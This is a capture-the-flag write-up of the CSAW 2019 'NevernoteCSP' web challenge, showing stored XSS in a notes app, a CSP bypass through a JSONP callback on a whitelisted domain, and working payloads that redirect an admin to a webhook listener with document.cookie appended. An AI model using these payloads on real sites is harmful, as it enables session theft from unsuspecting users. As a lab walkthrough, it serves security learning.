---
title: '[RED CSAW CTF 2019] NevernoteCSP'
published: true
tags: [writeup, web, csp]
author: sAINT_Barber
---

First we are greeted with the challenge description

![alt text][image1]

We will be performing some sort of cookie stealing, and we also understand from the title that it will be pointing to a type of CSP bypass.

After creating an account and clicking around on the site the only thing you could actually do was create and upload notes.

![alt text][image2]

So, we can edit the note title and give it some content. And then we can report the post to an admin.
By this one can assume we will be doing some XSS with a cookie stealing payload to steal the admins cookie and get the flag!

The only area that does not sanitize the users input is the content area. As you can see below i have changed the content style to bold with the `<b>` tag

![alt][image3]

Now lets add a script with a simple alert!
`<script>alert('Haircuts')</script>`

![alt][image4]

Nothing came up, but we did get a warning in the dev-tools console tab

![alt][image5]

Content Security Policy is blocking the inline script, from the name 'script-src' it only accepts javascript from a source file. From there we can view the CSP in the network tab by clicking on a request and checking the headers

![alt][image6]

We can copy the policy into this site to check its' evaluation:
https://csp-evaluator.withgoogle.com/

We can see that the
`script-src 'self' cdn.jsdelivr.net *.ngs.ru` trusts domains 2 that are known to bypass CSP

![alt][image7]

After some googling i found from the cdn.jsdeliver.net domain a callback function that reflects whatever javascript you equal it as.

`https://passport.ngs.ru/ajax/check?callback=alert('Haircuts')`

so now our payload looks like this:<br>
`<script src="https://passport.ngs.ru/ajax/check?callback=alert('Haircuts')"></script>`

Lets place this in the content part of a new note and see if we bypass the CSP

And voila! We bypassed the CSP. Now we can move on to getting the admins cookie!

![alt][image8]

In general what we need to do now is report our note to the admin, wait until he/she opens our note it should redirect him/her to a malicious site that we are listening on so we can see his/her cookies in the request header.

I will be using a site called Webhook (https://webhook.site) as my listener.

We can use this javascript code to redirect the admin to our site.
`window.location.replace('malicioussite.something')`<br>
Our payload now looks like this<br>

`<script src="https://passport.ngs.ru/ajax/check?callback=window.location.replace('https://webhook.site/fcaa41ba-87af-467e-9b5f-8437a8b3a762')"></script>`

Now all we need to do is add this payload then report to the admin, but if you're following along you will notice that as soon as we click on this note it will automatically redirect us to the webhooks listener (Thats what we want), and wont allow us to click the *report to admin link*. We can see the 'href' request makes: /notes/report/{note_id}, all we need to do is write down our note id and make a simple get request with that id.

Looking at the webhooks site we can see our admins request!

![alt][image9]

Perfect! Now all we need to do is use the document.cookie javascript method to print out the cookie, what i did is add the cookie to the query of the get request the admin performs on our malicious site e.g malicioussite.com/?name=sAINT_barber,

Now our payload looks like this:<br>
`<script src="https://passport.ngs.ru/ajax/check?callback=window.location.replace('https://webhook.site/fcaa41ba-87af-467e-9b5f-8437a8b3a762/?elaToCookie='.concat(document.cookie))"></script>`

*Note: I used the .concat() function to concatenate the document.cookie onto the query string, if you want to use the '+' sign then you will have to url encode it because the '+' in the url translates to a space.*

Now lets see if it works!

![alt][image10]

Boom! We can see in the Query strings our flag!

Note: If the cookie flag had the httpOnly flag then it would not print out with the document.cookie method.

A big Thank you to styx00! Not only did he help me complete the challenge, but also helped me understand the procedure of bypassing the CSP and Reflected XSS.

Flag: `flag{go_to_r/ProgrammerHumor_for_a_good_time}`



[image1]: /assets/2019-10-01-RED-CSAW19-NevernoteCSP/images/image1.png
[image2]: /assets/2019-10-01-RED-CSAW19-NevernoteCSP/images/image2.png
[image3]: /assets/2019-10-01-RED-CSAW19-NevernoteCSP/images/image3.png
[image4]: /assets/2019-10-01-RED-CSAW19-NevernoteCSP/images/image4.png
[image5]: /assets/2019-10-01-RED-CSAW19-NevernoteCSP/images/image5.png
[image6]: /assets/2019-10-01-RED-CSAW19-NevernoteCSP/images/image6.png
[image7]: /assets/2019-10-01-RED-CSAW19-NevernoteCSP/images/image7.png
[image8]: /assets/2019-10-01-RED-CSAW19-NevernoteCSP/images/image8.png
[image9]: /assets/2019-10-01-RED-CSAW19-NevernoteCSP/images/image9.png
[image10]: /assets/2019-10-01-RED-CSAW19-NevernoteCSP/images/image10.png